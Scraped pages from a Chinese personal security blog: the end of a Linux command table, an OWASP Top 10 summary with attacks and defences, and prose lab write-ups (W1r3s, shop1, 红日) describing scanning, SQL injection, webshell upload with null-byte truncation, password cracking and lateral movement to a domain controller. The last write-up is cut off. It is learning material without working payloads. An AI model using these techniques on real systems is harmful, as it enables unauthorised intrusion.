<td>打印文件内容</td>
</tr>
<tr>
<td>ps</td>
<td>报告shell进程状态</td>
</tr>
<tr>
<td>kill</td>
<td>终止程序</td>
</tr>
<tr>
<td>ping</td>
<td>测试网络连接</td>
</tr>
<tr>
<td>vim</td>
<td>高效文本编辑</td>
</tr>
<tr>
<td>history</td>
<td>显示以前的命令列表</td>
</tr>
<tr>
<td>passwd</td>
<td>更改用户密码</td>
</tr>
<tr>
<td>which</td>
<td>返回程序的完整二进制路径</td>
</tr>
<tr>
<td>shred</td>
<td>覆盖文件以隐藏其内容</td>
</tr>
<tr>
<td>less</td>
<td>以交互式检查文件</td>
</tr>
<tr>
<td>tail</td>
<td>显示文件的最后几行</td>
</tr>
<tr>
<td>head</td>
<td>显示文件的第一行</td>
</tr>
<tr>
<td>grep</td>
<td>打印与给定条件匹配行</td>
</tr>
<tr>
<td>whoami</td>
<td>输出用户名</td>
</tr>
<tr>
<td>whatis</td>
<td>显示单行说明</td>
</tr>
<tr>
<td>wc</td>
<td>字数文件</td>
</tr>
<tr>
<td>uname</td>
<td>显示操作系统信息</td>
</tr>
<tr>
<td>neofetch</td>
<td>显示操作系统和硬件信息</td>
</tr>
<tr>
<td>find</td>
<td>搜索遵循模式的文件</td>
</tr>
<tr>
<td>wget</td>
<td>从互联网检索文件</td>
</tr>
</tbody></table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/12/07/Top%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/07/Top%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Top漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-12-07 15:32:06" itemprop="dateCreated datePublished" datetime="2023-12-07T15:32:06+08:00">2023-12-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-23 09:46:48" itemprop="dateModified" datetime="2024-03-23T09:46:48+08:00">2024-03-23</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>20 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[TOC]</p>
<h3 id="👉🏻TOP1：越权漏洞-Broken-Access-Control"><a href="#👉🏻TOP1：越权漏洞-Broken-Access-Control" class="headerlink" title="👉🏻TOP1：越权漏洞 Broken Access Control"></a>👉🏻TOP1：越权漏洞 Broken Access Control</h3><p><strong>简介</strong></p>
<p>主要分为水平越权和垂直越权。</p>
<ol>
<li><p><strong>水平越权</strong>：普通用户拥有其他平行级别用户的权限</p>
</li>
<li><p><strong>垂直越权</strong>：跨越自身所属用户组，获取更高级别用户的权限（比如管理员权限）</p>
<p>​</p>
</li>
</ol>
<p><strong>常见情况</strong></p>
<ol>
<li><p>通过修改url、内部应用程序状态或HTML页面绕过访问控制检查，或简单地使用自定义的API攻击工具</p>
<blockquote>
<p>网站以用户提交的id判断用户是否具有信息查询权限并返回用户提交id对应的用户信息</p>
<p>避免方式：根据用户本身的Session判断当前用户是否拥有读取个人信息权限</p>
<p>漏洞利用示例：攻击者A利用抓包工具将自动发送的查询请求中的userid修改为B用户的id，就可以查询到B用户的信息；未加密且用的是get请求时，通过修改url里的userid直接登入其他用户的账号</p>
</blockquote>
</li>
<li><p>特权提升，垂直越权</p>
<blockquote>
<p>用户具有阅读文章权限而不具有编辑文章权限，阅读文章的接口是read_article。权限保护方式基于接口名称的秘密</p>
<p>漏洞出现原因：可以猜测到修改文章的接口是edit_article</p>
<p>漏洞利用示例：攻击者A根据阅读文章的接口名称是read_article猜测修改文章的接口名称是edit_article，调用该接口，实现垂直越权</p>
</blockquote>
</li>
<li><p>修改Cookie中参数</p>
<blockquote>
<p>早期的网站设计会在Cookie中加入“admin &#x3D; true”标识用户是否具有管理员权限</p>
<p>漏洞出现原因：Cookie不同于Session，Cookie中的参数存储在用户浏览器上，可以直观展现给用户；Session存储在服务器端，比Cookie安全</p>
<p>漏洞利用示例：攻击者A掌握网站的Cookie规律后</p>
<p>​                           方法①：通过JavaScript代码重置 document.cookie 内容越权</p>
<p>​                           方法②：抓包将“admin &#x3D; false”修改为“admin &#x3D; true”</p>
</blockquote>
</li>
<li><p>系统权限回收有问题</p>
<blockquote>
<p>漏洞出现原因：网站保留了注销用户信息而没有把它从用户表中删除，而仅仅对该用户是否有效这个字段进行了标记</p>
<p>漏洞利用示例：攻击者A注册时保留与注销用户B同样的用户id，覆盖了原用户的信息单保留了元用户的权限</p>
</blockquote>
<p>​</p>
</li>
</ol>
<p><strong>检测方法</strong></p>
<p>未授权访问与水平越权：cookie伪造；修改返回包中某个参数的值（比如false改为true）；水平越权常见与业务系统中，对用户信息或者订单信息进行增删改查操作时，用户编号和订单编号常常有规律可循，测试人员通过burpsuit的intruder对目标参数进行遍历测试即可</p>
<p>垂直越权：将cookie中的false改为true；文件上传与下载漏洞可以通过.&#x2F;和..&#x2F;绕过，admin权限验证绕过也可以尝试这种方法</p>
<p><strong>如何预防？</strong></p>
<p>将访问控制限制在仅在受信任的服务器端代码或者无服务器API中，这样攻击者就无法修改访问控制检查或元数据</p>
<ol>
<li><p>合理划分网站权限，设置功能验证，验证失败禁止访问</p>
</li>
<li><p>最小权限原则。除公有资源外，其他资源默认情况下拒绝访问，限制用户不必要的权限，用户权限过期后收回</p>
</li>
<li><p>进行严格的权限判断，用户只能操作属于自己的内容。此处权限判断需要识别用户身份，识别用户身份基于Session而非Cookie验证（即在服务器端进行验证）</p>
</li>
<li><p>记录失败的访问控制，适当时候对管理员进行告警（比如银行卡密码最多输入三次三次输错需要重新验证&#x2F;找管理员更改密码，不能无限次试。避免了暴力破解）</p>
</li>
<li><p>对API和控制器的访问进行速率限制（避免高速爆破），最大限度降低自动化攻击工具的危害（也会有后续处置，比如后台发现某个ip多次异常尝试且多次失败，就把ip封了） </p>
<p>​</p>
</li>
</ol>
<p><strong>补充知识</strong></p>
<ul>
<li>网站会给用户分配不同的Session（会话标识符）维持用户对话</li>
</ul>
<p>​                      </p>
<p>​                               </p>
<h3 id="👉🏻TOP2：加密机制失效-Cryptographic-Failures"><a href="#👉🏻TOP2：加密机制失效-Cryptographic-Failures" class="headerlink" title="👉🏻TOP2：加密机制失效  Cryptographic Failures"></a>👉🏻TOP2：加密机制失效  Cryptographic Failures</h3><p><strong>简介</strong></p>
<p>通常是缺乏加密措施或者加密失效导致敏感数据泄露</p>
<p>​            </p>
<p><strong>常见情况</strong></p>
<ol>
<li>以明文方式传输数据，未执行加密</li>
<li>使用旧or弱加密算法或协议</li>
<li>使用弱加密密钥、重复使用弱加密密钥、缺少适当的密钥管理和轮换、不小心将加密密钥提交到了源代码数据库中</li>
<li>接收到的服务器证书和信任链没有经过正确验证</li>
</ol>
<p>​    </p>
<p><strong>如何预防？</strong></p>
<ol>
<li>使用安全协议对所有数据进行传输加密</li>
<li>使用最新版且标准的强演算法、协定及密钥；使用适当的密钥管理</li>
<li>使用经过身份验证的加密而不仅仅是加密</li>
</ol>
<p>​    </p>
<p><strong>攻击范例</strong></p>
<ol>
<li><strong>情境1</strong>：某应用程序加密了存储在数据库中的信用卡号，但却在检索数据时自动解密，因此容易受到 SQL 注入攻击，导致信用卡号被泄露</li>
<li><strong>情境2</strong>：网站没有强制使用 TLS 或支持弱加密，导致攻击者能够通过网络监控、降级 HTTPS 连接为 HTTP，并截取会话 cookies，从而劫持用户的会话并访问或修改其隐私数据。攻击者还可以篡改传输的数据，例如修改汇款收款人信息</li>
<li><strong>情境3</strong>：密码库使用简单的散列函数存储密码，没有使用盐值或者使用了简单的盐值。由于上传文件的漏洞，攻击者可以访问密码库，未经盐值加密的哈希密码可以被预先计算的彩虹表破解。即使使用了盐值，如果哈希函数简单或快速，仍然容易受到 GPU 加速破解（PS：“盐”指随机生成的额外字符串）</li>
</ol>
<p>​                  </p>
<p>​                  </p>
<h3 id="👉🏻TOP3：注入攻击-Injection"><a href="#👉🏻TOP3：注入攻击-Injection" class="headerlink" title="👉🏻TOP3：注入攻击 Injection"></a>👉🏻TOP3：注入攻击 Injection</h3><p>web对用户输入的内容的合法性判断不严或者过滤不严，攻击者在web应用程序中事先定义好的查询语句的结尾添加额外的执行语句，在管理员不知情的情况下进行非法操作，奇葩数据库执行非授权的任意查询，进一步得到数据信息。</p>
<p>​    </p>
<p><strong>SQL注入</strong>：把SQL命令插入到Web表单递交或者输入域名或者页面请求的查询字符串，欺骗服务器执行恶意SQL命令</p>
<p><strong>SQL注入分类</strong>：所有与用户进行交互的地方都可能存在注入</p>
<ol>
<li><p>基于数据类型：字符串类型注入；整型注入</p>
</li>
<li><p>基于程度和顺序的注入：一阶注入；二阶注入</p>
</li>
<li><p>基于从服务器收到的响应</p>
</li>
<li><p>基于错误的SQL查询</p>
</li>
<li><p>联合查询的类型</p>
</li>
<li><p>堆查询注射</p>
</li>
<li><p>SQL盲注：基于布尔；时间；报错</p>
<p>​</p>
</li>
</ol>
<p><strong>注入思路</strong>：</p>
<ol>
<li>判断是否存在注入，类型是字符型还是数字型</li>
<li>猜解SQL查询语句中的字段数</li>
<li>确定显示的字段顺序</li>
<li>获取当前数据库</li>
<li>获取数据库中的表</li>
</ol>
<p><strong>盲注思路</strong></p>
<ol>
<li>判断是否存在注入，类型是字符型还是数字型</li>
<li>猜解SQL查询语句中的字段数</li>
<li>猜解数据库名</li>
<li>猜解数据库表名</li>
<li>猜解表中字段名</li>
<li>猜解数据</li>
</ol>
<p><strong>防范方式</strong></p>
<ol>
<li>关闭SQL错误回显</li>
<li>使用成熟的WAF</li>
<li>前端输入字符白名单验证（长度、类型）</li>
<li>SQL服务运行专门的账号并且使用最小权限</li>
<li>对输入的特殊字符进行转义处理</li>
</ol>
<p>​                </p>
<p>​                     </p>
<h3 id="👉🏻TOP4：不安全设计"><a href="#👉🏻TOP4：不安全设计" class="headerlink" title="👉🏻TOP4：不安全设计"></a>👉🏻TOP4：不安全设计</h3><p><strong>产生原因</strong></p>
<p>开发软件时在关键的身份验证、访问控制、业务逻辑和关键流部位没有进行安全的设计</p>
<p><strong>漏洞利用</strong></p>
<p>业务逻辑的体现</p>
<ol>
<li>支付逻辑</li>
<li>密码找回</li>
<li>验证码：暴力破解；重复使用；客户端回显；绕过；自动识别</li>
</ol>
<p><strong>支付逻辑漏洞</strong></p>
<p>修改支付价格、状态；修改购买数量；修改优惠券和积分；修改支付接口；多重替换支付；重复支付；最小额和最大额支付；无限制试用</p>
<p>​    </p>
<p><strong>场景</strong></p>
<ol>
<li>使用burpsuit抓包并且修改原始数据（用户界面数据无法更改，前端有封装），将运费金额30修改为9.9</li>
<li>把state的值从2修改为1，这样随机输入的密码也会被识别为真，导致任意密码重置</li>
</ol>
<p>​     </p>
<p>​    </p>
<h3 id="👉🏻TOP5：安全配置不当"><a href="#👉🏻TOP5：安全配置不当" class="headerlink" title="👉🏻TOP5：安全配置不当"></a>👉🏻TOP5：安全配置不当</h3><p>通常由于不安全的默认配置、不完整的临时配置、不必要的功能启用或者安装、开源云储存、错误的http标头配置、包含敏感信息的详细报错信息。因此不仅要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级</p>
<p><strong>案例</strong></p>
<ol>
<li>Tomcat、Apache服务器后台弱口令和服务器的不当配置容易被利用</li>
<li>中国电信交换机弱口令</li>
<li>行业内设备（比如华为的SmartAXMT调制解调器初始ip和默认密码是xxxxx都是已知的网上能找到的）</li>
</ol>
<p><strong>防范</strong></p>
<ol>
<li>按照加固手册加固</li>
<li>搭建最小化平台，这个平台不包含任何不必要的功能、组件、文档和示例，移除或者不安装不适用的功能和框架</li>
<li>临时文件及时删除</li>
</ol>
<p>​        </p>
<p>​           </p>
<h3 id="👉🏻TOP6：易受攻击和淘汰的组件"><a href="#👉🏻TOP6：易受攻击和淘汰的组件" class="headerlink" title="👉🏻TOP6：易受攻击和淘汰的组件"></a>👉🏻TOP6：易受攻击和淘汰的组件</h3><p>组件（例如库、框架、其他软件模块）拥有和应用程序相同的权限。如果应用程序中有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或者服务器接管，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御，造成攻击产生影响</p>
<p><strong>场景</strong></p>
<ol>
<li>某个组件出现新的漏洞，攻击者可能凭借这个情报利用这个组件漏洞攻击应用程序（信息不对称）</li>
</ol>
<p><strong>防范</strong></p>
<ol>
<li>移除不使用的依赖、不需要的功能、组件、文件和文档</li>
<li>仅从官方渠道获取组件，并使用签名机制来降低组件被篡改或被加入恶意漏洞的风险</li>
<li>持续监控CVE、NVD等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能，订阅组件漏洞最新信息的邮件以获取即时信息</li>
</ol>
<p>​           </p>
<p>​         </p>
<h3 id="👉🏻TOP7：认证及验证机制失效"><a href="#👉🏻TOP7：认证及验证机制失效" class="headerlink" title="👉🏻TOP7：认证及验证机制失效"></a>👉🏻TOP7：认证及验证机制失效</h3><p>错误使用应用程序的身份认证和会话功能管理，使攻击者能够破译密码、密钥或者会话令牌，或者利用其他开发缺陷冒充其他用户身份。web程序开发者过于专注程序功能开发，可能会建立自定义的认证和会话方案，这可能会存在漏洞。可能会在推出、密码管理、超时、密码找回、账户更新等方面存在漏洞。</p>
<p>也就是说在密码等重要数据进行交互的过程中程序存在问题，并且被利用</p>
<p><strong>情景</strong></p>
<ol>
<li>应用程序没有实施自动化威胁保护或撞库攻击保护的情况下，使用已知列表密码撞库（比如旧密码泄露）</li>
<li>使用明文、加密或者弱散列密码或者用户重复使用同一种密码，容易被暴力破解（不是特殊加密方法的话密码破解可能会很快）</li>
<li>缺少或失效的多因素身份验证</li>
<li>暴露url中的会话id</li>
<li>会话ID使用时间过长</li>
</ol>
<p><strong>防范</strong></p>
<ol>
<li><p>使用多因素身份验证</p>
</li>
<li><p>检查弱口令，模拟爆破操作</p>
</li>
<li><p>对API和控制器的访问进行速率限制，限制或逐渐延迟失败的登录尝试（避免高速爆破），最大限度降低自动化攻击工具的危害（也会有后续处置，比如后台发现某个ip多次异常尝试且多次失败，就把ip封了</p>
</li>
<li><p>session id 每隔一段时间就生成新的高度负责的新随机会话id。这个id不能出现在url中，登出、闲置、绝对超时的时候就使其失效</p>
<p>​</p>
</li>
</ol>
<p>​                                      </p>
<h3 id="👉🏻TOP8：软件和数据完整性失效-Software-and-Data-Integrity-Failures"><a href="#👉🏻TOP8：软件和数据完整性失效-Software-and-Data-Integrity-Failures" class="headerlink" title="👉🏻TOP8：软件和数据完整性失效 Software and Data Integrity Failures"></a>👉🏻TOP8：软件和数据完整性失效 Software and Data Integrity Failures</h3><p><strong>简介</strong></p>
<p>软件更新、关键资料（critical data）、持续集成&#x2F;持续部署（CI&#x2F;CD）流程等关键内容没有经过完整性验证导致产生的漏洞</p>
<blockquote>
<p>软件更新：指在已发布的软件版本中修复漏洞、增加功能或改进性能等目的而发布的新版本</p>
<p>关键资料：软件更新过程中使用的关键数据，比如用户隐私信息、安全凭证、加密密钥等</p>
<p>持续集成&#x2F;持续部署（CI&#x2F;CD）流程：旨在通过自动化构建、测试和部署流程来实现快速、频繁的软件发布。持续集成是指频繁地将开发人员的代码集成到共享存储库中，持续部署是指自动将通过测试的代码部署到生产环境中</p>
<p>没有经过完整性验证：指的是在软件更新过程中，假设了某些关键资料的完整性已经被验证，或者假设了CI&#x2F;CD流程的整体安全性和正确性，而实际上并没有进行充分的验证。这样的假设可能导致漏洞或安全风险的存在</p>
</blockquote>
<p>​                                                                                           </p>
<p><strong>常见情况</strong></p>
<ol>
<li><strong>不安全的序列化和反序列化</strong>：当对象或数据被编码或序列化成攻击者可以看到和修改的结构时，容易受到不安全的反序列化攻击</li>
<li><strong>依赖不受信任来源</strong>：应用程序来自不被信任的来源，包括一些不被信任的外部库、内容传递网络(CND)、库或者模组</li>
<li><strong>不安全的持续集成&#x2F;持续部署 (CI&#x2F;CD) 流程</strong>：不安全的集成&#x2F;部署(CI&#x2F;CD)流程可能导致未经授权的访问、恶意代码注入或系统破坏</li>
<li><strong>自动更新的安全性问题</strong>：很多应用程序会进行自动更新，在缺乏完整性验证的情况下把更新包应用到之前信任的应用程序上。这里攻击者可以上传自制的所谓“更新”内容在所有应用程序上运行，达到窃取信息等目的</li>
</ol>
<p>​                                          </p>
<p><strong>如何预防？</strong></p>
<ol>
<li>使用数字签名或者类似的机制验证软件数据来源正确且未被更改</li>
<li>使用可信任度较高的库和依赖项；确保安全工具验证组件不包含已知漏洞；尽量保证代码在构建和部署过程中的完整性；确保有代码审计和配置更改的审查流程，避免恶意代码或者恶意配置被引入软件流程</li>
<li>确保未签名或未加密的序列化数据不被发送到不受信任的客户端，除非有完整性检查或者数字签名来检测数据是否被篡改或重放。</li>
</ol>
<p>​        </p>
<p><strong>防范举例</strong></p>
<p>安卓手机，通过官方的应用商城安装软件相对比较安全，因为应用商城会对更新包和软件包进行检测以防范这种漏洞。如果从浏览器或者其他途径下载软件手机会警告用户软件可能不安全。</p>
<p>​                </p>
<p>​            </p>
<h3 id="👉🏻TOP9：安全记录记录和监控失效"><a href="#👉🏻TOP9：安全记录记录和监控失效" class="headerlink" title="👉🏻TOP9：安全记录记录和监控失效"></a>👉🏻TOP9：安全记录记录和监控失效</h3><p><strong>概念</strong></p>
<p>自己内部的检查能力不足，没办法在别人攻击自己的时候发现自己被攻击了</p>
<p><strong>场景</strong></p>
<ol>
<li><p>印度一家大型航空公司发生涉及数百万乘客超过十年包括护照及信用卡资料等个人资料的资料泄漏。资料泄漏发生在第三方供应商提供的云端服务，该供应商在资料泄漏发生一段时间后通知航空公司。</p>
</li>
<li><p>未记录可审计的事件，如登录、登录失败、高额交易</p>
</li>
<li><p>告警和错误事件未能产生或者产生不足和不清晰的日志信息</p>
</li>
<li><p>日志信息仅在本地存储，日志信息可能被消掉</p>
</li>
<li><p>没有利用应用系统、API的日志信息监控可以活动</p>
</li>
<li><p>对于实时或者准实时攻击，应用程序无法检测、处理和告警</p>
</li>
</ol>
<p><strong>防范</strong></p>
<ol>
<li>确保所有的登录、访问控制失效、输入验证失败能够被记录到日志中去，保留足够的用户上下文信息，识别可疑或者恶意账户，为货期取证预留时间</li>
<li>日志集中管理、备份</li>
<li>审计信息保存在只能增加不能删除的数据库中</li>
<li>建立有效的告警机制，使可疑活动在可接受的范围内被发现和应对</li>
</ol>
<h3 id="👉🏻TOP10：服务器端请求伪造"><a href="#👉🏻TOP10：服务器端请求伪造" class="headerlink" title="👉🏻TOP10：服务器端请求伪造"></a>👉🏻TOP10：服务器端请求伪造</h3><p>攻击者利用服务器上的应用程序，发送伪造请求到服务器内部或者其他内网，从而达到攻击的目的</p>
<ol>
<li>限制访问权限：确保服务器上的应用程序只能访问必要的资源，避免访问敏感的内部网络资源。</li>
<li>过滤和验证输入： 对用户输入进行有效的过滤和验证，确保输入的URL是合法的且安全的，防止攻击者利用URL参数进行攻击。</li>
<li>使用白名单： 配置白名单，只允许应用程序访问特定的URL或者IP地址，从而避免访问未经授权的资源。</li>
<li>使用防火墙和WAF： 配置防火墙和Web应用程序防火墙（WAF），监控和过滤服务器上的入站和出站流量，阻止恶意请求和攻击。</li>
<li>更新和维护： 定期更新和维护服务器上的软件和组件，修复已知的漏洞和安全问题</li>
</ol>
<p><strong>XXE</strong></p>
<p>应用程序解析XML文件时包含了对外部实体的引用，攻击者传递恶意包含XML代码的文件，读取指定服务器资源</p>
<p>防范：</p>
<ol>
<li>使用简单的数据格式（如JSON），避免对敏感数据序列化</li>
<li>服务器端实行白名单验证、过滤、清除，防止在XML或者标题中出现恶意数据</li>
<li>及时更新或者修复应用程序和底层操作系统使用的所有XML处理器和库</li>
<li></li>
</ol>
<h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF-跨站请求伪造"></a>CSRF-跨站请求伪造</h3><p>利用用户在某个网站上已经登录的身份，在用户不知情的情况下，在另一个网站上执行一些非法操作</p>
<p>已经在购物网站上登录，然后收到一封看起来很正常的电子邮件。点击邮件中的链接，不知不觉地执行了一个操作，比如购买了一件商品或者更改了密码</p>
<ol>
<li>在每个表单提交或者敏感操作中包含一个随机生成的Token，并在后端进行验证。这个Token在每次请求中都会发生变化，攻击者无法伪造有效的Token，从而阻止了CSRF攻击。</li>
<li>限制cookie的发送范围，只允许来自同一站点的请求携带Cookie，防止跨站请求伪造</li>
<li>服务器端对请求的Referer进行验证，确保请求来源合法</li>
<li>执行敏感操作的请求，需要用户进行双重确认，比如输入密码、验证码等</li>
<li>对于执行敏感操作的Session，设置短暂有效期，减少攻击者利用的时间窗口</li>
<li>使用POST方法而不是GET方法来执行敏感操作</li>
</ol>
<h3 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h3><p>将可执行的前端脚本代码（一般为JavaScript）植入到网页中，通过利用网页开发时留下的漏洞，注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</p>
<p>反射型：攻击者将JS代码作为请求参数放置URL中，诱导用户点击，落入陷阱<br>存储型：将攻击脚本入库存储，在后面进行查询时，再将攻击脚本渲染进网页，返回给浏览器触发执行</p>
<ol>
<li>输入验证和过滤： 对用户输入的内容进行严格的验证和过滤，确保其中不包含恶意脚本。可以使用白名单过滤、转义特殊字符等方式来防止</li>
<li>输出编码：使用合适的编码方式编码，防止浏览器误将其中的内容解析为可执行的脚本。常用的编码方式包括HTML编码、URL编码等。</li>
<li>HTTP头部设置： 在HTTP响应头中设置合适的Content-Security-Policy（CSP）头部，限制页面加载的资源和执行的脚本</li>
<li>将敏感信息存储在HttpOnly Cookie中，这样即使页面存在XSS漏洞，攻击者也无法窃取到Cookie中的敏感信息。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/11/06/%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/06/%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">10.07-11.05(2023)总结与拓展</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-06 23:56:06" itemprop="dateCreated datePublished" datetime="2023-11-06T23:56:06+08:00">2023-11-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-12 09:17:30" itemprop="dateModified" datetime="2024-03-12T09:17:30+08:00">2024-03-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="W1r3s靶场攻击"><a href="#W1r3s靶场攻击" class="headerlink" title="W1r3s靶场攻击"></a>W1r3s靶场攻击</h4><p><strong>思路</strong>：由于是内网渗透，首先进行主机的扫描来发现目标主机，之后对目标主机进行端口扫描查看开放的端口，在这里发现其21端口允许匿名登陆，以此为攻击点，对其进行漏洞脚本扫描，得到 &#x2F;wordpress&#x2F;wp-login.php，发现其漏洞，之后进行ftp匿名登录，将worktodo.txt以及employee-names.txt下载下来，得到一个新的ftp服务器以及两个字符串，访问nmap得到的 &#x2F;wordpress&#x2F;wp-login.php发现为一个登陆页面，常见的用户名密码登陆失败，决定进行目录爆破，在这里使用gobuster工具进行目录爆破，得到三个结果，挨个访问得到一个安装页面，在此页面中发现为cuppa cms，接下来进行cuppa cms渗透，通过cuppa cms的利用文件，可发现漏洞在 &#x2F;alerts&#x2F;alertConfigField.php中，查看发现为使用post方法传递参数并且将他拼接至前面文件中包含过来，使用curl命令得到密码的内容，发现加密，使用John进行破解得到破解后的密码，最后使用ssh获取shell与提权，通过破解过的密码成功获取root权限。</p>
<p><strong>攻击工具</strong>：nmap，gobuster，John</p>
<p><strong>防御方法</strong>：关闭匿名登陆</p>
<h4 id="shop1靶场"><a href="#shop1靶场" class="headerlink" title="shop1靶场"></a>shop1靶场</h4><p><strong>思路</strong>：首先尝试默认登录后台未成功，使用阿D注入工具（SQL注入的渗透测试工具）扫描注入点，等到两组登录信息，登录成功。尝试上传一句话木马，更改为.jpg格式，将图片与木马链接上传并抓包。在信息路径下添加888.asp.jpg，进行00截断（利用了字符串的结束标识符“0x00”的特性，攻击者可以在目标文件名或URL中手动添加字符串标识符，将后面的内容进行截断，从而绕过某些安全检测），木马添加成功，在菜刀工具中输入木马路径即可修改任意文件。</p>
<p><strong>攻击工具</strong>：阿D注入工具、菜刀、MD5</p>
<p><strong>防御方法</strong>：</p>
<p>密码强度和保护（启用多因素身份验证可以增加额外的安全层）</p>
<p>安全配置和更新（及时更新软件和操作系统，以及设置适当的安全组和防火墙规则）</p>
<p>输入验证和过滤（对所有用户输入进行验证和过滤）</p>
<p>文件上传安全控制（限制上传的文件类型和大小并设置合适的文件存储路径和命名规则。）</p>
<p>安全扫描和监控（定期进行安全扫描和监控，以发现和修复潜在的安全漏洞）</p>
<p>访问控制和权限管理（实施严格的权限管理策略）</p>
<h4 id="尤里的复仇-sql注入"><a href="#尤里的复仇-sql注入" class="headerlink" title="尤里的复仇-sql注入"></a>尤里的复仇-sql注入</h4><p><strong>攻击思路和原理</strong>：sql注入与数据库对话，获得账号和密码，进入后台，上传木马，最后连接菜刀，达到控制网站的目的。</p>
<p><strong>防御方法</strong>：防御sql注入可以将sql语句转化成无法执行的sql语句，这样攻击者就无法和数据库进行对话。</p>
<h4 id="尤里的复仇-信息收集1"><a href="#尤里的复仇-信息收集1" class="headerlink" title="尤里的复仇-信息收集1"></a>尤里的复仇-信息收集1</h4><p><strong>攻击思路和原理</strong>：通过御剑扫描后台，这里是二级目录，然后获得flag</p>
<p><strong>防御方法</strong>：后台路径如果和大家的认知一样，就很容易被发现，因此设计网站时需要把后台的路径名设置的和认知不一样。</p>
<h4 id="尤里的复仇-绕过WAF"><a href="#尤里的复仇-绕过WAF" class="headerlink" title="尤里的复仇-绕过WAF"></a>尤里的复仇-绕过WAF</h4><p>网站做了WAF过滤防护，因此用cookie注入进行绕过，获得账号和密码，再用御剑扫描，获得后台路径，输入账号密码，得到flag</p>
<h4 id="红日靶场"><a href="#红日靶场" class="headerlink" title="红日靶场"></a>红日靶场</h4><p><strong>思路</strong>：首先进行网络配置，添加一个外网，一个内网。将攻击机kali第一个适配器连接互联网，第二个使用外网。将web服务器（win7）,一个适配器连内网，第二个连外网。开始进行web渗透，通过端口扫描、目录爆破等尝试操作，进行信息收集，主要目的是为发现有关目标系统的漏洞，这是后续进行攻击的前提。接下来是利用漏洞：目录爆破发现了后台登录（phpmyadmin页面），通过bp暴力破解之后成功登录，之后在SQL界面尝试用日志写下一句话木马getshell,成功执行。通过webshell将探测等攻击文件成功植入(目标主机)win7，拿到权限。之后就进入到，权限维持和内网渗透的步骤了主要收集是关于域控的环境探测的信息，接着尝试使用远程桌面连接控制失败，用msf创建并运行木马尝试修改密码，提权成功。获取了域用户的密码信息，然后开始内网主机探测（扫描内网网段），至此内网信息收集结束。最后是横向移动：对域控渗透并进行IPC连接。让域控访问win7的指定端口，win7监听指定端口并将监听到的流量转发给kali的指定端口，在攻击机（kali）上监听，成功获取域控的shell。</p>
<h4 id="Hackdamic"><a href="#Hackdamic" class="headerlink" title="Hackdamic"></a>Hackdamic</h4><p><strong>思路</strong>：</p>
<p>①主机发现和端口扫描</p>
